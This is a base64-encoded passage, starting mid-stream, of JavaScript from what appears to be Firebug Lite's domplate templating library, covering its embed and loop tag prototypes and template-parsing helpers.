0ZSBfX3BhdGhfXyBvZmZzZXQ6ICIrIG9mZnNldCsiXG4iKTsNCiAgICAgICAgICAgIHZhciByb290ID0gcGFyZW50Ow0KDQogICAgICAgICAgICBmb3IgKHZhciBpID0gMjsgaSA8IGFyZ3VtZW50cy5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgaW5kZXggPSBhcmd1bWVudHNbaV07DQogICAgICAgICAgICAgICAgaWYgKGkgPT0gMykNCiAgICAgICAgICAgICAgICAgICAgaW5kZXggKz0gb2Zmc2V0Ow0KDQogICAgICAgICAgICAgICAgaWYgKGluZGV4ID09IC0xKQ0KICAgICAgICAgICAgICAgICAgICBwYXJlbnQgPSBwYXJlbnQucGFyZW50Tm9kZTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHBhcmVudCA9IHBhcmVudC5jaGlsZE5vZGVzW2luZGV4XTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy9pZiAoRkJUcmFjZS5EQkdfRE9NKSBGQlRyYWNlLnN5c291dCgiZG9tcGxhdGU6ICIrYXJndW1lbnRzWzJdKyIsIHJvb3Q6ICIrIHJvb3QrIiwgcGFyZW50OiAiKyBwYXJlbnQrIlxuIik7DQogICAgICAgICAgICByZXR1cm4gcGFyZW50Ow0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIGpzID0gZm5CbG9jay5qb2luKCIiKTsNCiAgICAgICAgLy9pZiAoRkJUcmFjZS5EQkdfRE9NKSBGQlRyYWNlLnN5c291dChqcy5yZXBsYWNlKC8oXDt8XHspL2csICIkMVxuIikpOw0KICAgICAgICB2YXIgciA9IG51bGw7DQogICAgICAgIGV2YWwoanMpOw0KICAgICAgICB0aGlzLnJlbmRlckRPTSA9IHI7DQogICAgfSwNCg0KICAgIGdlbmVyYXRlRE9NOiBmdW5jdGlvbihwYXRoLCBibG9ja3MsIGFyZ3MpDQogICAgew0KICAgICAgICBpZiAodGhpcy5saXN0ZW5lcnMgfHwgdGhpcy5wcm9wcykNCiAgICAgICAgICAgIHRoaXMuZ2VuZXJhdGVOb2RlUGF0aChwYXRoLCBibG9ja3MpOw0KDQogICAgICAgIGlmICh0aGlzLmxpc3RlbmVycykNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmxpc3RlbmVycy5sZW5ndGg7IGkgKz0gMikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgdmFsID0gdGhpcy5saXN0ZW5lcnNbaSsxXTsNCiAgICAgICAgICAgICAgICB2YXIgYXJnID0gZ2VuZXJhdGVBcmcodmFsLCBwYXRoLCBhcmdzKTsNCiAgICAgICAgICAgICAgICAvL2Jsb2Nrcy5wdXNoKCdub2RlLmFkZEV2ZW50TGlzdGVuZXIoIicsIHRoaXMubGlzdGVuZXJzW2ldLCAnIiwgX19iaW5kX18odGhpcywgJywgYXJnLCAnKSwgZmFsc2UpOycpOw0KICAgICAgICAgICAgICAgIGJsb2Nrcy5wdXNoKCdhZGRFdmVudChub2RlLCAiJywgdGhpcy5saXN0ZW5lcnNbaV0sICciLCBfX2JpbmRfXyh0aGlzLCAnLCBhcmcsICcpLCBmYWxzZSk7Jyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAodGhpcy5wcm9wcykNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgbmFtZSBpbiB0aGlzLnByb3BzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciB2YWwgPSB0aGlzLnByb3BzW25hbWVdOw0KICAgICAgICAgICAgICAgIHZhciBhcmcgPSBnZW5lcmF0ZUFyZyh2YWwsIHBhdGgsIGFyZ3MpOw0KICAgICAgICAgICAgICAgIGJsb2Nrcy5wdXNoKCdub2RlLicsIG5hbWUsICcgPSAnLCBhcmcsICc7Jyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICB0aGlzLmdlbmVyYXRlQ2hpbGRET00ocGF0aCwgYmxvY2tzLCBhcmdzKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfSwNCg0KICAgIGdlbmVyYXRlTm9kZVBhdGg6IGZ1bmN0aW9uKHBhdGgsIGJsb2NrcykNCiAgICB7DQogICAgICAgIGJsb2Nrcy5wdXNoKCJ2YXIgbm9kZSA9IF9fcGF0aF9fKHJvb3QsIG8iKTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwYXRoLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgYmxvY2tzLnB1c2goIiwiLCBwYXRoW2ldKTsNCiAgICAgICAgYmxvY2tzLnB1c2goIik7Iik7DQogICAgfSwNCg0KICAgIGdlbmVyYXRlQ2hpbGRET006IGZ1bmN0aW9uKHBhdGgsIGJsb2NrcywgYXJncykNCiAgICB7DQogICAgICAgIHBhdGgucHVzaCgwKTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmNoaWxkcmVuLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgY2hpbGQgPSB0aGlzLmNoaWxkcmVuW2ldOw0KICAgICAgICAgICAgaWYgKGlzVGFnKGNoaWxkKSkNCiAgICAgICAgICAgICAgICBwYXRoW3BhdGgubGVuZ3RoLTFdICs9ICcrJyArIGNoaWxkLnRhZy5nZW5lcmF0ZURPTShwYXRoLCBibG9ja3MsIGFyZ3MpOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHBhdGhbcGF0aC5sZW5ndGgtMV0gKz0gJysxJzsNCiAgICAgICAgfQ0KICAgICAgICBwYXRoLnBvcCgpOw0KICAgIH0NCn07DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCkZCTC5Eb21wbGF0ZUVtYmVkLnByb3RvdHlwZSA9IGNvcHlPYmplY3QoRkJMLkRvbXBsYXRlVGFnLnByb3RvdHlwZSwNCi8qKiBAbGVuZHMgRkJMLkRvbXBsYXRlRW1iZWQucHJvdG90eXBlICovDQp7DQogICAgbWVyZ2U6IGZ1bmN0aW9uKGFyZ3MsIG9sZFRhZykNCiAgICB7DQogICAgICAgIHRoaXMudmFsdWUgPSBvbGRUYWcgPyBvbGRUYWcudmFsdWUgOiBwYXJzZVZhbHVlKGFyZ3NbMF0pOw0KICAgICAgICB0aGlzLmF0dHJzID0gb2xkVGFnID8gb2xkVGFnLmF0dHJzIDoge307DQogICAgICAgIHRoaXMudmFycyA9IG9sZFRhZyA/IGNvcHlBcnJheShvbGRUYWcudmFycykgOiBbXTsNCg0KICAgICAgICB2YXIgYXR0cnMgPSBhcmdzWzFdOw0KICAgICAgICBmb3IgKHZhciBuYW1lIGluIGF0dHJzKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgdmFsID0gcGFyc2VWYWx1ZShhdHRyc1tuYW1lXSk7DQogICAgICAgICAgICB0aGlzLmF0dHJzW25hbWVdID0gdmFsOw0KICAgICAgICAgICAgcmVhZFBhcnROYW1lcyh2YWwsIHRoaXMudmFycyk7DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gY3JlYXRvcih0aGlzLCBEb21wbGF0ZUVtYmVkKTsNCiAgICB9LA0KDQogICAgZ2V0VmFyTmFtZXM6IGZ1bmN0aW9uKG5hbWVzKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMudmFsdWUgaW5zdGFuY2VvZiBQYXJ0cykNCiAgICAgICAgICAgIG5hbWVzLnB1c2godGhpcy52YWx1ZS5wYXJ0c1swXS5uYW1lKTsNCg0KICAgICAgICBpZiAodGhpcy52YXJzKQ0KICAgICAgICAgICAgbmFtZXMucHVzaC5hcHBseShuYW1lcywgdGhpcy52YXJzKTsNCiAgICB9LA0KDQogICAgZ2VuZXJhdGVNYXJrdXA6IGZ1bmN0aW9uKHRvcEJsb2NrLCB0b3BPdXRzLCBibG9ja3MsIGluZm8pDQogICAgew0KICAgICAgICB0aGlzLmFkZENvZGUodG9wQmxvY2ssIHRvcE91dHMsIGJsb2Nrcyk7DQoNCiAgICAgICAgYmxvY2tzLnB1c2goJ19fbGlua19fKCcpOw0KICAgICAgICBhZGRQYXJ0cyh0aGlzLnZhbHVlLCAnJywgYmxvY2tzLCBpbmZvKTsNCiAgICAgICAgYmxvY2tzLnB1c2goJywgX19jb2RlX18sIF9fb3V0X18sIHsnKTsNCg0KICAgICAgICB2YXIgbGFzdE5hbWUgPSBudWxsOw0KICAgICAgICBmb3IgKHZhciBuYW1lIGluIHRoaXMuYXR0cnMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChsYXN0TmFtZSkNCiAgICAgICAgICAgICAgICBibG9ja3MucHVzaCgnLCcpOw0KICAgICAgICAgICAgbGFzdE5hbWUgPSBuYW1lOw0KDQogICAgICAgICAgICB2YXIgdmFsID0gdGhpcy5hdHRyc1tuYW1lXTsNCiAgICAgICAgICAgIGJsb2Nrcy5wdXNoKCciJywgbmFtZSwgJyI6Jyk7DQogICAgICAgICAgICBhZGRQYXJ0cyh2YWwsICcnLCBibG9ja3MsIGluZm8pOw0KICAgICAgICB9DQoNCiAgICAgICAgYmxvY2tzLnB1c2goJ30pOycpOw0KICAgICAgICAvL3RoaXMuZ2VuZXJhdGVDaGlsZE1hcmt1cCh0b3BCbG9jaywgdG9wT3V0cywgYmxvY2tzLCBpbmZvKTsNCiAgICB9LA0KDQogICAgZ2VuZXJhdGVET006IGZ1bmN0aW9uKHBhdGgsIGJsb2NrcywgYXJncykNCiAgICB7DQogICAgICAgIHZhciBlbWJlZE5hbWUgPSAnZScrcGF0aC5lbWJlZEluZGV4Kys7DQoNCiAgICAgICAgdGhpcy5nZW5lcmF0ZU5vZGVQYXRoKHBhdGgsIGJsb2Nrcyk7DQoNCiAgICAgICAgdmFyIHZhbHVlTmFtZSA9ICdkJyArIHBhdGgucmVuZGVySW5kZXgrKzsNCiAgICAgICAgdmFyIGFyZ3NOYW1lID0gJ2QnICsgcGF0aC5yZW5kZXJJbmRleCsrOw0KICAgICAgICBibG9ja3MucHVzaChlbWJlZE5hbWUgKyAnID0gX19saW5rX18obm9kZSwgJywgdmFsdWVOYW1lLCAnLCAnLCBhcmdzTmFtZSwgJyk7Jyk7DQoNCiAgICAgICAgcmV0dXJuIGVtYmVkTmFtZTsNCiAgICB9DQp9KTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KRkJMLkRvbXBsYXRlTG9vcC5wcm90b3R5cGUgPSBjb3B5T2JqZWN0KEZCTC5Eb21wbGF0ZVRhZy5wcm90b3R5cGUsDQovKiogQGxlbmRzIEZCTC5Eb21wbGF0ZUxvb3AucHJvdG90eXBlICovDQp7DQogICAgbWVyZ2U6IGZ1bmN0aW9uKGFyZ3MsIG9sZFRhZykNCiAgICB7DQogICAgICAgIHRoaXMudmFyTmFtZSA9IG9sZFRhZyA/IG9sZFRhZy52YXJOYW1lIDogYXJnc1swXTsNCiAgICAgICAgdGhpcy5pdGVyID0gb2xkVGFnID8gb2xkVGFnLml0ZXIgOiBwYXJzZVZhbHVlKGFyZ3NbMV0pOw0KICAgICAgICB0aGlzLnZhcnMgPSBbXTsNCg0KICAgICAgICB0aGlzLmNoaWxkcmVuID0gb2xkVGFnID8gY29weUFycmF5KG9sZFRhZy5jaGlsZHJlbikgOiBbXTsNCg0KICAgICAgICB2YXIgb2Zmc2V0ID0gTWF0aC5taW4oYXJncy5sZW5ndGgsIDIpOw0KICAgICAgICBwYXJzZUNoaWxkcmVuKGFyZ3MsIG9mZnNldCwgdGhpcy52YXJzLCB0aGlzLmNoaWxkcmVuKTsNCg0KICAgICAgICByZXR1cm4gY3JlYXRvcih0aGlzLCBEb21wbGF0ZUxvb3ApOw0KICAgIH0sDQoNCiAgICBnZXRWYXJOYW1lczogZnVuY3Rpb24obmFtZXMpDQogICAgew0KICAgICAgICBpZiAodGhpcy5pdGVyIGluc3RhbmNlb2YgUGFydHMpDQogICAgICAgICAgICBuYW1lcy5wdXNoKHRoaXMuaXRlci5wYXJ0c1swXS5uYW1lKTsNCg0KICAgICAgICBEb21wbGF0ZVRhZy5wcm90b3R5cGUuZ2V0VmFyTmFtZXMuYXBwbHkodGhpcywgW25hbWVzXSk7DQogICAgfSwNCg0KICAgIGdlbmVyYXRlTWFya3VwOiBmdW5jdGlvbih0b3BCbG9jaywgdG9wT3V0cywgYmxvY2tzLCBpbmZvKQ0KICAgIHsNCiAgICAgICAgdGhpcy5hZGRDb2RlKHRvcEJsb2NrLCB0b3BPdXRzLCBibG9ja3MpOw0KDQogICAgICAgIHZhciBpdGVyTmFtZTsNCiAgICAgICAgaWYgKHRoaXMuaXRlciBpbnN0YW5jZW9mIFBhcnRzKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcGFydCA9IHRoaXMuaXRlci5wYXJ0c1swXTsNCiAgICAgICAgICAgIGl0ZXJOYW1lID0gcGFydC5uYW1lOw0KDQogICAgICAgICAgICBpZiAocGFydC5mb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwYXJ0LmZvcm1hdC5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICAgICAgaXRlck5hbWUgPSBwYXJ0LmZvcm1hdFtpXSArICIoIiArIGl0ZXJOYW1lICsgIikiOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIGl0ZXJOYW1lID0gdGhpcy5pdGVyOw0KDQogICAgICAgIGJsb2Nrcy5wdXNoKCdfX2xvb3BfXy5hcHBseSh0aGlzLCBbJywgaXRlck5hbWUsICcsIF9fb3V0X18sIGZ1bmN0aW9uKCcsIHRoaXMudmFyTmFtZSwgJywgX19vdXRfXykgeycpOw0KICAgICAgICB0aGlzLmdlbmVyYXRlQ2hpbGRNYXJrdXAodG9wQmxvY2ssIHRvcE91dHMsIGJsb2NrcywgaW5mbyk7DQogICAgICAgIHRoaXMuYWRkQ29kZSh0b3BCbG9jaywgdG9wT3V0cywgYmxvY2tzKTsNCiAgICAgICAgYmxvY2tzLnB1c2goJ31dKTsnKTsNCiAgICB9LA0KDQogICAgZ2VuZXJhdGVET006IGZ1bmN0aW9uKHBhdGgsIGJsb2NrcywgYXJncykNCiAgICB7DQogICAgICAgIHZhciBpdGVyTmFtZSA9ICdkJytwYXRoLnJlbmRlckluZGV4Kys7DQogICAgICAgIHZhciBjb3VudGVyTmFtZSA9ICdpJytwYXRoLmxvb3BJbmRleDsNCiAgICAgICAgdmFyIGxvb3BOYW1lID0gJ2wnK3BhdGgubG9vcEluZGV4Kys7DQoNCiAgICAgICAgaWYgKCFwYXRoLmxlbmd0aCkNCiAgICAgICAgICAgIHBhdGgucHVzaCgtMSwgMCk7DQoNCiAgICAgICAgdmFyIHByZUluZGV4ID0gcGF0aC5yZW5kZXJJbmRleDsNCiAgICAgICAgcGF0aC5yZW5kZXJJbmRleCA9IDA7DQoNCiAgICAgICAgdmFyIG5vZGVDb3VudCA9IDA7DQoNCiAgICAgICAgdmFyIHN1YkJsb2NrcyA9IFtdOw0KICAgICAgICB2YXIgYmFzZVBhdGggPSBwYXRoW3BhdGgubGVuZ3RoLTFdOw0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRoaXMuY2hpbGRyZW4ubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIHBhdGhbcGF0aC5sZW5ndGgtMV0gPSBiYXNlUGF0aCsnKycrbG9vcE5hbWUrJysnK25vZGVDb3VudDsNCg0KICAgICAgICAgICAgdmFyIGNoaWxkID0gdGhpcy5jaGlsZHJlbltpXTsNCiAgICAgICAgICAgIGlmIChpc1RhZyhjaGlsZCkpDQogICAgICAgICAgICAgICAgbm9kZUNvdW50ICs9ICcrJyArIGNoaWxkLnRhZy5nZW5lcmF0ZURPTShwYXRoLCBzdWJCbG9ja3MsIGFyZ3MpOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIG5vZGVDb3VudCArPSAnKzEnOw0KICAgICAgICB9DQoNCiAgICAgICAgcGF0aFtwYXRoLmxlbmd0aC0xXSA9IGJhc2VQYXRoKycrJytsb29wTmFtZTsNCg0KICAgICAgICBibG9ja3MucHVzaChsb29wTmFtZSwnID0gX19sb29wX18uYXBwbHkodGhpcywgWycsIGl0ZXJOYW1lLCAnLCBmdW5jdGlvbignLCBjb3VudGVyTmFtZSwnLCcsbG9vcE5hbWUpOw0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHBhdGgucmVuZGVySW5kZXg7ICsraSkNCiAgICAgICAgICAgIGJsb2Nrcy5wdXNoKCcsZCcraSk7DQogICAgICAgIGJsb2Nrcy5wdXNoKCcpIHsnKTsNCiAgICAgICAgYmxvY2tzLnB1c2goc3ViQmxvY2tzLmpvaW4oIiIpKTsNCiAgICAgICAgYmxvY2tzLnB1c2goJ3JldHVybiAnLCBub2RlQ291bnQsICc7Jyk7DQogICAgICAgIGJsb2Nrcy5wdXNoKCd9XSk7Jyk7DQoNCiAgICAgICAgcGF0aC5yZW5kZXJJbmRleCA9IHByZUluZGV4Ow0KDQogICAgICAgIHJldHVybiBsb29wTmFtZTsNCiAgICB9DQp9KTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KLyoqIEBjbGFzcyAqLw0KZnVuY3Rpb24gVmFyaWFibGUobmFtZSwgZm9ybWF0KQ0Kew0KICAgIHRoaXMubmFtZSA9IG5hbWU7DQogICAgdGhpcy5mb3JtYXQgPSBmb3JtYXQ7DQp9DQoNCi8qKiBAY2xhc3MgKi8NCmZ1bmN0aW9uIFBhcnRzKHBhcnRzKQ0Kew0KICAgIHRoaXMucGFydHMgPSBwYXJ0czsNCn0NCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCmZ1bmN0aW9uIHBhcnNlUGFydHMoc3RyKQ0Kew0KICAgIHZhciByZSA9IC9cJChbX0EtWmEtel1bX0EtWmEtejAtOS58XSopL2c7DQogICAgdmFyIGluZGV4ID0gMDsNCiAgICB2YXIgcGFydHMgPSBbXTsNCg0KICAgIHZhciBtOw0KICAgIHdoaWxlIChtID0gcmUuZXhlYyhzdHIpKQ0KICAgIHsNCiAgICAgICAgdmFyIHByZSA9IHN0ci5zdWJzdHIoaW5kZXgsIChyZS5sYXN0SW5kZXgtbVswXS5sZW5ndGgpLWluZGV4KTsNCiAgICAgICAgaWYgKHByZSkNCiAgICAgICAgICAgIHBhcnRzLnB1c2gocHJlKTsNCg0KICAgICAgICB2YXIgZXhwciA9IG1bMV0uc3BsaXQoInwiKTsNCiAgICAgICAgcGFydHMucHVzaChuZXcgVmFyaWFibGUoZXhwclswXSwgZXhwci5zbGljZSgxKSkpOw0KICAgICAgICBpbmRleCA9IHJlLmxhc3RJbmRleDsNCiAgICB9DQoNCiAgICBpZiAoIWluZGV4KQ0KICAgICAgICByZXR1cm4gc3RyOw0KDQogICAgdmFyIHBvc3QgPSBzdHIuc3Vic3RyKGluZGV4KTsNCiAgICBpZiAocG9zdCkNCiAgICAgICAgcGFydHMucHVzaChwb3N0KTsNCg0KICAgIHJldHVybiBuZXcgUGFydHMocGFydHMpOw0KfQ0KDQpmdW5jdGlvbiBwYXJzZVZhbHVlKHZhbCkNCnsNCiAgICByZXR1cm4gdHlwZW9mKHZhbCkgPT0gJ3N0cmluZycgPyBwYXJzZVBhcnRzKHZhbCkgOiB2YWw7DQp9DQoNCmZ1bmN0aW9uIHBhcnNlQ2hpbGRyZW4oYXJncywgb2Zmc2V0LCB2YXJzLCBjaGlsZHJlbikNCnsNCiAgICBmb3IgKHZhciBpID0gb2Zmc2V0OyBpIDwgYXJncy5sZW5ndGg7ICsraSkNCiAgICB7DQogICAgICAgIHZhciB2YWwgPSBwYXJzZVZhbHVlKGFyZ3NbaV0pOw0KICAgICAgICBjaGlsZHJlbi5wdXNoKHZhbCk7DQogICAgICAgIHJlYWRQYXJ0TmFtZXModmFsLCB2YXJzKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIHJlYWRQYXJ0TmFtZXModmFsLCB2YXJzKQ0Kew0KICAgIGlmICh2YWwgaW5zdGFuY2VvZiBQYXJ0cykNCiAgICB7DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdmFsLnBhcnRzLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcGFydCA9IHZhbC5wYXJ0c1tpXTsNCiAgICAgICAgICAgIGlmIChwYXJ0IGluc3RhbmNlb2YgVmFyaWFibGUpDQogICAgICAgICAgICAgICAgdmFycy5wdXNoKHBhcnQubmFtZSk7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGdlbmVyYXRlQXJnKHZhbCwgcGF0aCwgYXJncykNCnsNCiAgICBpZiAodmFsIGluc3RhbmNlb2YgUGFydHMpDQogICAgew0KICAgICAgICB2YXIgdmFscyA9IFtdOw0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHZhbC5wYXJ0cy5sZW5ndGg7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHBhcnQgPSB2YWwucGFydHNbaV07DQogICAgICAgICAgICBpZiAocGFydCBpbnN0YW5jZW9mIFZhcmlhYmxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciB2YXJOYW1lID0gJ2QnK3BhdGgucmVuZGVySW5kZXgrKzsNCiAgICAgICAgICAgICAgICBpZiAocGFydC5mb3JtYXQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBqID0gMDsgaiA8IHBhcnQuZm9ybWF0Lmxlbmd0aDsgKytqKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyTmFtZSA9IHBhcnQuZm9ybWF0W2pdICsgJygnICsgdmFyTmFtZSArICcpJzsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB2YWxzLnB1c2godmFyTmFtZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgdmFscy5wdXNoKCciJytwYXJ0LnJlcGxhY2UoLyIvZywgJ1xcIicpKyciJyk7DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gdmFscy5qb2luKCcrJyk7DQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIGFyZ3MucHVzaCh2YWwpOw0KICAgICAgICByZXR1cm4gJ3MnICsgcGF0aC5zdGF0aWNJbmRleCsrOw0KICAgIH0NCn0NCg0KZnVuY3Rpb24gYWRkUGFydHModmFsLCBkZWxpbSwgYmxvY2ssIGluZm8sIGVzY2FwZUl0KQ0Kew0KICAgIHZhciB2YWxzID0gW107DQogICAgaWYgKHZhbCBpbnN0YW5jZW9mIFBhcnRzKQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB2YWwucGFydHMubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYXJ0ID0gdmFsLnBhcnRzW2ldOw0KICAgICAgICAgICAgaWYgKHBhcnQgaW5zdGFuY2VvZiBWYXJpYWJsZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgcGFydE5hbWUgPSBwYXJ0Lm5hbWU7DQogICAgICAgICAgICAgICAgaWYgKHBhcnQuZm9ybWF0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaiA9IDA7IGogPCBwYXJ0LmZvcm1hdC5sZW5ndGg7ICsraikNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnROYW1lID0gcGFydC5mb3JtYXRbal0gKyAiKCIgKyBwYXJ0TmFtZSArICIpIjsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBpZiAoZXNjYXBlSXQpDQogICAgICAgICAgICAgICAgICAgIHZhbHMucHVzaCgiX19lc2NhcGVfXygiICsgcGFydE5hbWUgKyAiKSIpOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgdmFscy5wdXNoKHBhcnROYW1lKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB2YWxzLnB1c2goJyInKyBwYXJ0ICsgJyInKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBlbHNlIGlmIChpc1RhZyh2YWwpKQ0KICAgIHsNCiAgICAgICAgaW5mby5hcmdzLnB1c2godmFsKTsNCiAgICAgICAgdmFscy5wdXNoKCdzJytpbmZvLmFyZ0luZGV4KyspOw0KICAgIH0NCiAgICBlbHNlDQogICAgICAgIHZhbHMucHVzaCgnIicrIHZhbCArICciJyk7DQoNCiAgICB2YXIgcGFydHMgPSB2YWxzLmpvaW4oZGVsaW0pOw0KICAgIGlmIChwYXJ0cykNCiAgICAgICAgYmxvY2sucHVzaChkZWxpbSwgcGFydHMpOw0KfQ0KDQpmdW5jdGlvbiBpc1RhZyhvYmopDQp7DQogICAgcmV0dXJuICh0eXBlb2Yob2JqKSA9PSAiZnVuY3Rpb24iIHx8IG9iaiBpbnN0YW5jZW9mIEZ1bmN0aW9uKSAmJiAhIW9iai50YWc7DQp9DQoNCmZ1bmN0aW9uIGNyZWF0b3IodGFnLCBjb25zKQ0Kew0KICAgIHZhciBmbiA9IG5ldyBGdW5jdGlvbigNCiAgICAgICAgInZhciB0YWcgPSBhcmd1bWVudHMuY2FsbGVlLnRhZzsiICsNCiAgICAgICAgInZhciBjb25zID0gYXJndW1lbnRzLmNhbGxlZS5jb25zOyIgKw0KICAgICAgICAidmFyIG5ld1RhZyA9IG5ldyBjb25zKCk7IiArDQogICAgICAgICJyZXR1cm4gbmV3VGFnLm1lcmdlKGFyZ3VtZW50cywgdGFnKTsiKTsNCg0KICAgIGZuLnRhZyA9IHRhZzsNCiAgICBmbi5jb25zID0gY29uczsNCiAgICBleHRlbmQoZm4sIFJlbmRlcmVyKTsNCg0KICAgIHJldHVybiBmbjsNCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KZnVuY3Rpb24gY29weUFycmF5KG9sZEFycmF5KQ0Kew0KICAgIHZhciBhcnkgPSBbXTsNCiAgICBpZiAob2xkQXJyYXkpDQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgb2xkQXJyYXkubGVuZ3RoOyArK2kpDQogICAgICAgICAgICBhcnkucHVzaChvbGRBcnJheVtpXSk7DQogICByZXR1cm4gYXJ5Ow0KfQ0KDQpmdW5jdGlvbiBjb3B5T2JqZWN0KGwsIHIpDQp7DQogICAgdmFyIG0gPSB7fTsNCiAgICBleHRlbmQobSwgbCk7DQogICAgZXh0ZW5kKG0sIHIpOw0KICAgIHJldHVybiBtOw0KfQ0KDQpmdW5jdGlvbiBleHRlbmQobCwgcikNCnsNCiAgICBmb3IgKHZhciBuIGluIHIpDQogICAgICAgIGxbbl0gPSByW25dOw0KfQ0KDQpmdW5jdGlvbiBhZGRFdmVudChvYmplY3QsIG5hbWUsIGhhbmRsZXIpDQp7DQogICAgaWYgKGRvY3VtZW50LmFsbCkNCiAgICAgICAgb2JqZWN0LmF0dGFjaEV2ZW50KCJvbiIrbmFtZSwgaGFuZGxlcik7DQogICAgZWxzZQ0KICAgICAgICBvYmplY3QuYWRkRXZlbnRMaXN0ZW5lcihuYW1lLCBoYW5kbGVyLCBmYWxzZSk7DQp9DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCi8qKiBAY2xhc3MgKi8NCmZ1bmN0aW9uIEFycmF5SXRlcmF0b3IoYXJyYXkpDQp7DQogICAgdmFyIGluZGV4ID0gLTE7DQoNCiAgICB0aGlzLm5leHQgPSBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoKytpbmRleCA+PSBhcnJheS5sZW5ndGgpDQogICAgICAgICAgICB0aHJvdyBTdG9wSXRlcmF0aW9uOw0KDQogICAgICAgIHJldHVybiBhcnJheVtpbmRleF07DQogICAgfTsNCn0NCg0KLyoqIEBjbGFzcyAqLw0KZnVuY3Rpb24gU3RvcEl0ZXJhdGlvbigpIHt9DQoNCkZCTC4kYnJlYWsgPSBmdW5jdGlvbigpDQp7DQogICAgdGhyb3cgU3RvcEl0ZXJhdGlvbjsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovKiogQG5hbWVzcGFjZSAqLw0K